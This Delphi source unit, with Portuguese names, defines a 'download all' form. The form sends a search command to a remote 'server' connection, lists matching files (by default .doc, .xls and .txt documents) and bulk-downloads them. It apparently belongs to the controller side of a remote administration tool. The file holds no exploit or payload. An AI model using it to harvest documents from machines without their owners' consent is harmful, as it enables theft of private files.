unit UnitDownloadAll;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, ComCtrls, sStatusBar, UnitMain, UnitConexao,
  Menus, AppEvnts;

type
  TRecDownloadAll = record
    Filter: array [0..1000] of char;
    Option: integer;
  end;

type
  TFormDownloadAll = class(TForm)
    Panel1: TPanel;
    RadioGroup1: TRadioGroup;
    Label1: TLabel;
    Edit1: TEdit;
    Button1: TButton;
    ListView2: TListView;
    sStatusBar1: TsStatusBar;
    PopupMenu1: TPopupMenu;
    Marcartodos1: TMenuItem;
    Desmarcartodos1: TMenuItem;
    N1: TMenuItem;
    Marcarselecionados1: TMenuItem;
    Desmarcarselecionados1: TMenuItem;
    N2: TMenuItem;
    Baixar1: TMenuItem;
    N3: TMenuItem;
    Novapesquisa1: TMenuItem;
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Marcartodos1Click(Sender: TObject);
    procedure Baixar1Click(Sender: TObject);
    procedure ListView2ColumnClick(Sender: TObject; Column: TListColumn);
    procedure Novapesquisa1Click(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    FilesList: string;
    DownloadAll: TRecDownloadAll;
    DownFile: string;
    FormFileManager: TForm;
  	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
  	procedure Message1(var Message: TMessage); message 5555;
  	procedure Message2(var Message: TMessage); message 5556;
  	procedure Message3(var Message: TMessage); message 5557;
  	procedure Message4(var Message: TMessage); message 5558;
  	procedure Message5(var Message: TMessage); message 5559;
  	procedure Message6(var Message: TMessage); message 5560;

    procedure AtualizarIdiomas;
  public
    { Public declarations }
    procedure LoadDownloadFiles;
  end;

implementation

{$R *.dfm}

uses
  UnitFileManager,
  UnitConstantes,
  UnitStrings,
  UnitCommonProcedures,
  DateUtils;

var
  LastSortedColumn: TListColumn;
  Ascending: boolean;

type
  TDownBuffer = Class
    Buffer: string;
  end;

function SortByColumn(Item1, Item2: TListItem; Data: integer): integer; stdcall;
var
  n1,n2: int64;
  s1,s2: string;
  ex1,ex2: extended;
  num: integer;
  Date1,Date2: TDateTime;
begin
  if (LastSortedColumn.Index = 1) or
     (LastSortedColumn.Index = 4) then
  begin
    if LastSortedColumn.Index = 1 then
    begin
       n1 := StrToIntDef(Inttostr(int64(Item1.SubItems.Objects[0])),0);
       n2 := StrToIntDef(Inttostr(int64(Item2.SubItems.Objects[0])),0);
    end;

    if LastSortedColumn.Index = 4 then
    begin
      try
        Date1 := StrToDateTime(Copy(Item1.SubItems[3], 1, posex(' ', Item1.SubItems[3]) - 1));
        except
      end;
      try
        Date2 := StrToDateTime(Copy(Item2.SubItems[3], 1, posex(' ', Item2.SubItems[3]) - 1));
        except
      end;
      Result := CompareDateTime(Date1, Date2);
      if not Ascending then Result := - Result;
      exit;
    end;
    if (n1 = n2) then Result := 0 else if (n1 > n2) then Result := 1 else Result := -1;

  end else
  begin
    Result := 0;
    if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption)
    else Result := AnsiCompareText(Item1.SubItems[Data-1],Item2.SubItems[Data-1]);
  end;

  if not Ascending then Result := -Result;
end;

procedure TFormDownloadAll.Marcartodos1Click(Sender: TObject);
var
  i: integer;
begin
  for I := 0 to ListView2.Items.Count - 1 do
  begin
    if Sender = Marcartodos1 then ListView2.Items.Item[i].Checked := True else
    if Sender = Desmarcartodos1 then ListView2.Items.Item[i].Checked := False else
    if (Sender = Marcarselecionados1) and (ListView2.Items.Item[i].Selected = True) then
      ListView2.Items.Item[i].Checked := True else
    if (Sender = Desmarcarselecionados1) and (ListView2.Items.Item[i].Selected = True) then
      ListView2.Items.Item[i].Checked := False;
  end;
end;

procedure TFormDownloadAll.Message1(var Message: TMessage);
begin
  Servidor := TConexaoNew(Message.WParam);
end;

procedure TFormDownloadAll.Message2(var Message: TMessage);
begin
  DownFile := string(Message.wParam);
  //MessageBox(0, pchar(DownFile), '', 0);
end;

procedure TFormDownloadAll.Message3(var Message: TMessage);
begin
  FilesList := string(Message.wParam);
end;

procedure TFormDownloadAll.Message4(var Message: TMessage);
begin
  Edit1.Clear;
  FillChar(DownloadAll, SizeOf(DownloadAll), #0);
  CopyMemory(@DownloadAll, pointer(Message.wParam), SizeOf(DownloadAll));
end;

procedure TFormDownloadAll.Message5(var Message: TMessage);
begin
  FormFileManager := TFormFileManager(Message.wParam);
end;

procedure TFormDownloadAll.Message6(var Message: TMessage);
var
  FileName: string;
  i: integer;
begin
  FileName := string(Message.wParam);
  for I := ListView2.Items.Count - 1 downto 0 do
  if FileName = ListView2.Items.Item[i].Caption then
  begin
    ListView2.Items.Item[i].Delete;
    break;
  end;
  sStatusbar1.Panels.Items[0].Text := Traduzidos[635] + ': ' + IntToStr(ListView2.Items.Count);
end;

procedure TFormDownloadAll.Novapesquisa1Click(Sender: TObject);
begin
  ListView2.Clear;
  RadioGroup1.Enabled := True;
  Edit1.Enabled := True;
  Button1.Enabled := True;
  Edit1.Text := '*.doc;*.docx;*.xls;*.xlsx;*.txt;*.rft;';
  RadioGroup1.ItemIndex := 1;
  DeleteFile(DownFile);
end;

procedure TFormDownloadAll.AtualizarIdiomas;
begin
  ListView2.Column[0].Caption := traduzidos[282];
  ListView2.Column[1].Caption := traduzidos[158];
  ListView2.Column[2].Caption := traduzidos[212];
  ListView2.Column[3].Caption := traduzidos[283];
  ListView2.Column[4].Caption := traduzidos[310];
  RadioGroup1.Caption := Traduzidos[626];
  RadioGroup1.Items[0] := Traduzidos[627];
  RadioGroup1.Items[1] := Traduzidos[628];
  Caption := Traduzidos[624];
  Label1.Caption := Traduzidos[625];

  Marcartodos1.Caption := Traduzidos[629];
  Desmarcartodos1.Caption := Traduzidos[630];
  Marcarselecionados1.Caption := Traduzidos[631];
  Desmarcarselecionados1.Caption := Traduzidos[632];
  Baixar1.Caption := Traduzidos[633];
  Novapesquisa1.Caption := Traduzidos[636];
end;

procedure TFormDownloadAll.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdiomas;
end;

procedure TFormDownloadAll.Baixar1Click(Sender: TObject);
begin
  TFormFileManager(FormFileManager).IniciarDownloadAll(Handle);
end;

procedure TFormDownloadAll.Button1Click(Sender: TObject);
begin
  Servidor.EnviarString(FMDOWNLOADALL + '|' + inttostr(radiogroup1.ItemIndex) + '|' + LowerCase(Edit1.Text));
  radiogroup1.Enabled := False;
  Edit1.Enabled := False;
  Button1.Enabled := False;
  ListView2.Items.Clear;
  sStatusbar1.Panels.Items[0].Text := Traduzidos[634];
end;

procedure TFormDownloadAll.FormClose(Sender: TObject; var Action: TCloseAction);
var
  i: integer;
  MS: TMemoryStream;
  TempStr: string;
begin
  if ListView2.Items.Count <= 0 then Exit;

  MS := TMemoryStream.Create;
  MS.Write(DownloadAll, SizeOf(TRecDownloadAll));
  for i := 0 to ListView2.Items.Count - 1 do
  begin
    TempStr := TDownBuffer(ListView2.Items.Item[i].SubItems.Objects[1]).Buffer;
    MS.Write(TempStr[1], Length(TempStr) * 2);
  end;
  ForceDirectories(ExtractFilePath(DownFile));
  MS.SaveToFile(DownFile);
  MS.Free;
end;

procedure TFormDownloadAll.FormShow(Sender: TObject);
begin
  AtualizarIdiomas;
end;

procedure TFormDownloadAll.ListView2ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  Ascending := not Ascending;
  if Column <> LastSortedColumn then Ascending := not Ascending;
  for i := 0 to Listview2.Columns.Count -1 do Listview2.Column[i].ImageIndex := -1;
  LastSortedColumn := Column;
  Listview2.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TFormDownloadAll.LoadDownloadFiles;
var
  Li: TListItem;
  FindData: TWIN32FindData;
  TempDir: string;
  Tempstr: string;
  DownBuffer: TDownBuffer;
begin
  ListView2.Items.BeginUpdate;
  if ListView2.Items.Count > 0 then ListView2.Items.Clear;

  TempStr := FilesList;

  while TempStr <> '' do
  begin
    TempDir := copy(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
    delete(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
    delete(TempStr, 1, length(delimitadorComandos));

    DownBuffer := TDownBuffer.Create;
    DownBuffer.Buffer := TempDir + delimitadorComandos;
    DownBuffer.Buffer := DownBuffer.Buffer + Copy(TempStr, 1, SizeOf(TWIN32FindData));

    ZeroMemory(@FindData, SizeOf(TWIN32FindData));
    CopyMemory(@FindData, @TempStr[1], SizeOf(TWIN32FindData));
    delete(TempStr, 1, SizeOf(TWIN32FindData));

    Li := ListView2.Items.Add;
    Li.Caption := TempDir + string(FindData.cFileName);
    Li.SubItems.AddObject(FileSizeToStr(FindData.nFileSizeLow), TObject(FindData.nFileSizeLow));
    Li.SubItems.AddObject(UnitFileManager.GetAttrib(FindData), TObject(DownBuffer));
    Li.SubItems.Add(uppercase(extractfileext(FindData.cFileName)));
    Li.SubItems.Add(DateTimeToStr(UnitFileManager.FileTimeToDateTime(FindData.ftCreationTime)));
    LI.ImageIndex := - 1;
    LI.Checked := True;
  end;
  ListView2.Items.EndUpdate;
  sStatusbar1.Panels.Items[0].Text := Traduzidos[635] + ': ' + IntToStr(ListView2.Items.Count);
end;

procedure TFormDownloadAll.PopupMenu1Popup(Sender: TObject);
begin
  Marcarselecionados1.Enabled := False;
  Desmarcarselecionados1.Enabled := False;
  if ListView2.Selected = nil then exit;
  Marcarselecionados1.Enabled := True;
  Desmarcarselecionados1.Enabled := True;
end;

end.
